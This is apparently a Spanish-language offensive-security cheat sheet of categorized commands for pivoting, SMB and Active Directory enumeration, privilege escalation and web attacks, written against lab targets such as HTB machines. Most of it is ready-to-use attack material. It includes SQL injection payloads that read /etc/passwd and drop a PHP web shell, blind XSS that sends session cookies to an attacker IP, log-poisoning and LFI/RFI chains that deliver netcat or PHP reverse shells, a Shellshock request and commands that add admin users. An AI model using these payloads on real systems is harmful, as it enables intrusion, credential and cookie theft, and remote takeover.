+Descripcion: Imprimir cuantas veces se repite un dato en un texto grande
+Comando: awk '{for (i=1;i<=NF;i++) a[$i]++;} END{for (i in a)print i"="a[i]}' ip | sort -rnt= -k2,2
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "chisel"
+Descripcion: Tuneling con chisel y proxychains
+Comando: 
+1) ./chisel server --reverse -p 1233 - Colocar chisel en modo servidor (En mi host)
+2) Configurar el archivo /etc/proxychains4.conf agregando:
+socks5 127.0.0.1 1080
+3) ./chisel client 10.10.14.12:1233 R:socks - Conectar el cliente al servidor (En la victima)
+4) Ejecutar cuaqluier comando a mi localhost ingresandp antes proxychains
+NOTA: Esto funsiona cuando queremos traer varios puertos al mismo tiempo y no uno por uno
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SMB"
+Protocolo: "SMB"
+Herramienta: "enum4linux"
+Descripcion: Enumeracion SMB con enum4linux y credenciales
+Comando:  enum4linux -u 'svc_apache' -p 'S@Ss!K@*t13'  flight.htb -A
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SMB"    
+Protocolo: "SMB"
+Herramienta: "crackmapexec"
+Descripcion: Enumeracion de usuaios con SMB
+Comando:  crackmapexec smb flight.htb -u usuario 'password' --users
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SMB"
+Protocolo: "SMB"
+Herramienta: "put"
+Descripcion: Subir archivos mediante SMB
+Comando:  put file.txt
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Windows"
+Herramienta: "RunaCS"
+Descripcion: Cambiarte de usuario en windows
+Comando:  
+Cuando dispones de credenciales de otro usuario y no hay agun servicio como ssh,winrm,etc. Usar RunasCs.exe
+RunasCs.exe <usuario> <password> powershell -r 10.10.14.12:5555
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Windows"
+Herramienta: "netstat"
+Descripcion: Revisar las conexiones activas en Windows
+Comando: netstat -a
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "nmap"
+Protocolo: "HTTPS"
+Herramienta: "nmap"
+Descripcion: Enumeracion de cifrados con nmap
+Comando: nmap -sV --script ssl-enum-ciphers -p443 10.10.10.10 -vvv
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Fuzzing"
+Protocolo: "HTTP"
+Herramienta: "gobuster"
+Descripcion: Enumeracion de directorios
+Comando: gobuster dir -u http://10.10.10.10/ -w directory-list-2.3-medium.txt -t 100 -x php,txt,html --add-slash
+NOTA: al agregar --add-slash es probbable que encuentre mas directorios
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Fuzzing"
+Protocolo: "DNS"
+Herramienta: "gobuster"
+Descripcion: Enumeracion de subdominios
+Comando: gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Fuzzing"
+Protocolo: "HTTP"
+Herramienta: "wfuzz"
+Descripcion: Enumeracion de directorios
+Comando: wfuzz -c --hc=404  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.10/FUZZ 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Recon"
+Protocolo: "DNS"
+Herramienta: "comandos"
+Descripcion: Enumeracion de subdominios localmente (Util cuando comprometiste una maquina y quieres ver is existen mas subdominios en ella
+Comando: cat /etc/hosts / Cuando se trate de servidores nginx Revisar (ls) la ruta: /etc/nginx/sites-enabled 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SQLI"
+Protocolo: "SQL"
+Herramienta: "sqlmap"
+Descripcion: Obtener las bases de datos 
+Comando: sqlmap -u http://10.10.110.45/login/ --data "username=admin&password=pass" --method POST --dbs
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SQLI"
+Protocolo: "SQL"
+Herramienta: "sqlmap"
+Descripcion: Obtener las tablas de una base de datos   
+Comando: sqlmap -u http://10.10.110.45/login/ --data "username=admin&password=pass" --method POST -D <database_name> --tables
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SQLI"
+Protocolo: "SQL"
+Herramienta: "sqlmap"
+Descripcion: Obtener las columnas de una tabla de una base de datos
+Comando: sqlmap -u http://10.10.110.45/login/ --data "username=admin&password=pass" --method POST -D <database_name> -T <table_name> --columns
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SQLI"
+Protocolo: "SQL"
+Herramienta: "sqlmap"
+Descripcion: Obtener el contenido de una columna de una tabla de una base de datos
+Comando: sqlmap -u http://10.10.110.45/login/ --data "username=admin&password=pass" --method POST -D users -T logins -C username --dump
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "chisel"
+Descripcion: Remote Port Forwarding con chisel
+Comando: 
+1 ./chisel server --reverse -p 1233 (En mi host)
+2 ./chisel client 10.10.14.10:1233 R:127.0.0.1:80:172.19.0.2:80 (En el host remoto)
+---------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Comandos"
+Herramienta: "grep"
+Descripcion: Imprimir el numero de activos vivos por segmento 
+Comando: grep -i "hosts up" *.nmap | awk '{print $1, $14, $15}' | tr -d '()' | tr '\#\:' '\-\ ' | sed 's/.nmap//' | sed 's/DISCOVERY_/Segmento: /' ' 
+---------------------------------------------------------------------------------------------------------------------------
+Categoria: "AV"
+Protocolo: "Comandos"
+Herramienta: "nessus"
+Descripcion: Inicializar nessus
+Comando: 
+1.Ejeuctar: /sbin/service nessusd start
+2.Entrar a https://127.0.0.1:8834
+---------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "socat"
+Descripcion: Redirigir trafico por puertos (util para rev shell en pivoting) 
+Comando:
+./socat TCP-LISTEN:4545,fork tcp:10.10.14.9:5555 &
+---------------------------------------------------------------------------------------------------------------------------
+Categoria: "Privilege Escalation"
+Protocolo: "Comandos"
+Herramienta: "cron"
+Descripcion: Buscar tareas cron
+Comando:
+1. cat /etc/crontab
+2. ls /var/spool/cron/crontabs
+3. ls /etc/cron.d
+---------------------------------------------------------------------------------------------------------------------------
+Categoria: "Transferencia de archivos"
+Protocolo: "TCP"
+Herramienta: "perl"
+Descripcion: Transferir archivos con perl
+Comando: perl -e 'use File::Fetch; my $url = "http://172.19.0.3:3322/socat"; my $ff = File::Fetch->new(uri=>$url); my $file = $ff->fetch() or die $ff->error'
+---------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "socat"
+Descripcion: Redirigir trafico por puerto, en este caso al colocar STDOUT es como si pusiera un netcat ya que me llega directamente la shell donde ejecuto socat
+Comando: ./socat TCP-LISTEN:9003 STDOUT
+---------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "smbmap"
+Descripcion: Descargar archivos de un recurso
+Comando: smbmap -H 192.168.0.8 --download anonymous/attention.txt
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Comandos"
+Herramienta: "cut"
+Descripcion: Imprimir ciertas columnas tomando como delimitador un caracter (similar a awk)
+Comando: cut -d '/' -f 1-7
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Privilege Escalation"
+Protocolo: "Comandos"
+Herramienta: "find"
+Descripcion: Buscar archivos SUID
+Comando: find \-perm -4000 2>/dev/null 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Privoting"
+Protocolo: "TCP"
+Herramienta: "proxychains"
+Descripcion: Enumerar puertos con nmap y proxychains
+Comando: proxychains nmap -sT -sV 10.10.0.129 -vvv -Pn -T5 -n -p- 2>&1 | grep -vE "timeout|OK"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Privilege Escalation"
+Protocolo: "TCP"
+Herramienta: "netstat"
+Descripcion: Revisar los puertos abiertos internamente
+Comando: 
+netstat -nat 
+ss -nltp
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "proxychains"
+Descripcion: Local Port Forwarding con proxychains y chisel
+Comando:proxychains ssh user@10.10.0.128 -L 8080:127.0.0.1:8080
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "net"
+Descripcion: Crear un usuario
+Comando: net user <user_name> <password> /add
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "net"
+Descripcion: Obtener informacion de un usuario
+Comando: net user <user_name>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "net"
+Descripcion: Agregar un usuario al grupo Administradores
+Comando: net localgroup Administrators <usuario> /add 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Comandos"
+Herramienta: "watch"
+Descripcion: Ejecutar un comando cada segundo (Util para monitorear)
+Comando: watch -n 1 <comando>
+Ejemplo: watch -n 1 ls -la /bin/bash
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "Comandos"
+Herramienta: "arp"
+Descripcion: Descubrir equipos en la red
+Comando: arp -a
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "TCP"
+Herramienta: "proxychains"
+Descripcion: Descubrir puertos mediante doble tunel con xargs, proxychains y nmap (Util para hacer que el escaneo avance mucho mas rapido que solo usar nmap y proxychains
+Comando: seq 1 1000 | xargs -P 50 -I {} proxychains nmap -p{} -sT -Pn 172.17.0.129 --open -T5 -vvv -n 2>&1 | grep -vE "chain|Initiating|Starting|timeout|seconds|Read|Completed|Scanning|report|up|Scanned"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pivoting"
+Protocolo: "HTTP"
+Herramienta: "gobuster"
+Descripcion: Enumeracion de directorios utilizando gobuster y socks (Es mas rapido de esta forma a poner proxychains antes del comando)
+Comando: gobuster dir -u http://172.17.0.129/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:8888
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "SQLi"
+Descripcion: Inyeccion SQL basada en error
+Comando: 
+1. Deteccion -> Ingresar en un input o url una ' si se recibe un error de sintaxis SQL es vulnerable
+2. Colocar un ordenamiento ingresando muchas columas -> order by 100-- - (Probarlo sin comilla antes y con comilla)
+3. Para saber el numero de columnas exacto de la BD empezar a jugar con los numeros es decir ingresar order by 1-- - , order by 2-- - ... hasta que no se muestre el error Unknow columns 
+4. Una vez que se concocen las columnas exactas de la BD aplicar una seleccion -> union select 1,2,3,4,5-- -
+5. Saber el nombre de la BD en uso -> union select 1,database(),3,4,5-- - 
+6. Saber el nombre dle usuario usando la BD -> union select 1,user(),3,4,5-- -
+7. Saber la version del DBMS de la BD -> union select 1,version(),3,4,5-- -
+8. Cargar archivos de la maquina local -> union select 1,load_file('/etc/passwd'),3,4,5-- -
+9.Conocer otras BDs que la maquina aloje -> union select 1,schema_name,3,4,5 from information_schema.schemata-- -
+NOTA: En caso de no mostrarlas por este metodo, jugar con limit
+union select 1,schema_name,3,4,5 from information_schema.schemata limit 1,1-- -
+union select 1,schema_name,3,4,5 from information_schema.schemata limit 2,1-- -
+10. Enumerar las tablas de una BD -> union select 1,table_name,3,4,5 from information_schema.tables where table_schema = "nombre_bd"-- -
+NOTA: En caso de que no muestre nada pasar el nombre de la BD  a hexadecimal -> echo "Secret" | xxd -ps (Copiar los valores omitiendo el 0a)
+union select 1,table_name,3,4,5 from information_schema.tables where table_schema = 0x536563726574-- - 
+NOTA: Colocar un 0x antes del valor en hexadecimal
+11. Listar las columnas de una tabla de una BD -> union select 1,column_name,3,4,5 from information_schema.columns where table_schema = 0x536563726574 and table_name = 0x5573657273-- -
+NOTA: El nombre de la tabla tambien va en headecimal repiteiendo el mismo procedimiento previo
+12.Dumpear las columnas de una tabla de una BD ->  union select 1,concat(Username,0x3a,Password),3,4,5 from Secret.Users-- -
+NOTA: Se agregan 0x3a ya que representa dos puntos para que las represente como user:pass
+13. Depositar contenido en una ruta -> ' union select "probando" into outfile "/var/www/html/prueba.txt"-- -
+' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "SQLi"
+Descripcion: Inyeccion SQL basada en tiempo
+Comando: admin' and sleep(10)-- -
+NOTA: Probarla en todos los inputs hasta saber cual es el vulnerable, posteriormente seguir con los scripts para la enum de BDs, Tablas, Columnas, etc.
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "Reflected XSS"
+Descripcion: Reflected Cross-Site Scripting XSS
+Comando: <script>alert("Probando XSS")</script> 
+1. <script>alert(document.cookie)</script> Listar el contenido de mi cookie (Se necesita estar autenticado)
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "Blind XSS"
+Descripcion: Blind Cross-Site Scripting XSS
+Comando: La idea es enviar la cookie de sesion del usuario a un servidor tercero  
+1. python3 -m http.server 80 -> Colocar un servidor temporal 
+2. <script>document.write('<img src="http://10.10.14.5/srp3rr1n.jpg?cookie=' + document.cookie +'">')</script> ->Enviar la cookie de sesion de los usuarios autenticados a un servidor tercero
+ <script>document.location="http://10.10.14.5/?cookie=" + document.cookie</script>
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "Log Poisoning"
+Descripcion: LFI to RCE mediante log poisoning
+Comando: La idea es revisar si tenemos acceso a los archivos log, en caso de tenerlo podemos usarlos para ocasionar un RCE
+1. Si el recurso /var/log/apache2/access.log se puede consultar realizar una consulta a la pagina web cambiando el User-Agent por un codio PHP, de esta forma al visualizar el recurso Access.log de Apache el codigo php se interpreta en el User-Agent.
+1.1 curl -s -H "User-Agent: <?php system('whoami'); ?>" "http://10.10.10.10/example.php?file=/var/log/apache2/access.log"  
+
+2. Si el recurso /var/log/auth.log se puede consultar se pueden realizar intentos fallidos mediante ssh para generar un reporte en este recurso y poder inscrutar codigo php que permitira desde el LFI ejecutar comandos
+2.1 Codificar en base64 una rev shell mediante netcat -> echo "nc -e /bin/bash 127.0.0.1 443" | base64; echo 
+2.2 El comando que se inyectara decodificara la cadena en base64 y la ejecutara echo "bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK" | base64 -d | bash
+2.3 En ssh ejcutar -> ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK | base64 -d | bash"); ?>@127.0.0.1 
+
+3.  Si la maquina tiene el servicio smtp ejecutandose verificar si el recurso /var/mail/usuario esta disponible 
+3.1 Verificar que usuarios existen en el sistema consultando el /etc/passwd 
+3.2 Crear un log que sea interpretado por la web, conectar por telnet a la maquina y enviar un correo 
+  Telnet 127.0.0.1 25 
+  MAIL FROM: p3rr1n 
+  RCPT TO: www-data
+  DATA
+  <?php system($_GET['cmd']); ?>   
+3.3 Consultar la ruta http://127.0.0.1/example.php?page=/var/mail/www-data?cmd=whoami
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "Shell Shock"
+Descripcion: Shell Shock
+Comando: Siempre que se tengan archivos con extensiones .cgi o bien directorio cgi-bin y dentro de ese directorio subdirectorios puede que se trate de un shellshock
+1. curl -s -X GET "http://192.168.0.18/cgi-bin/underworld" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
+NOTA: En ataques shell shock se recomienda poner la ruta absoluta de los comandos para evitar errors con la ejecución de los mismos
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "RFI"
+Descripcion: Remote File Inclusion
+Comando: Similar a un LFI, montar un servidor temporal en mi maquina y desde la web tratra de solicitar un recurso de mi maquina
+1. python3 -m http.server 80
+2. http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.5/wp-load.php
+NOTA: El archivo wp-load.php tendra una rev shell de php, al momento de llamarlo desde el navegador tendremos una shell de la maquina
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "LFI"
+Descripcion: LFI to RFI Windows
+Comando: 
+1. Coloque un recurso compartido por smb -> impacket-smbserver smbFolder $(pwd) -smb2support
+2. Habilitar el servicio smb en mi equipo de atacante -> service smbd start
+3. Compartir el recurso compartido dandole permisos a todos -> net usershare add smbFolder $(pwd) '' 'Everyone:F' 'guest_ok=y'
+4. Crear un recurso en mi maquina info.php con el contenido <?php phpinfo(); ?>
+5. Llamarlo desde la pagina de la maquina victima http://10.10.10.10/lang.php=\\10.10.14.5\smbFolder\info.php
+6. Obtener una shell https://10.10.110.213/lang.php?page=\\10.10.14.38\smbFolder\cmd.php&cmd=\\10.10.14.38\smbFolder\nc.exe -e cmd 10.10.14.38 443
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Pentesting Web"
+Vulnerabilidad: "LFI"
+Descripcion: LFI Wrappers
+Comando:
+1. Wrapper para codificar archivos en base64  php://filter/convert.base64-encode/resource=db.php
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "impacket"
+Descripcion: Iniciar sesion por smb cuando marque un pwned
+Comando: impacket-psexec WORKGROUP/Administrator@10.10.110.213 cmd.exe
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SQL"
+Protocolo: "SQL"
+Herramienta: "sqsh"
+Descripcion: Conectarse con el servicio SQL
+Comando: sqsh -S 10.10.110.58 -U 'sa' 
+------------------------------------------------------------------------------------------------------------------------------------
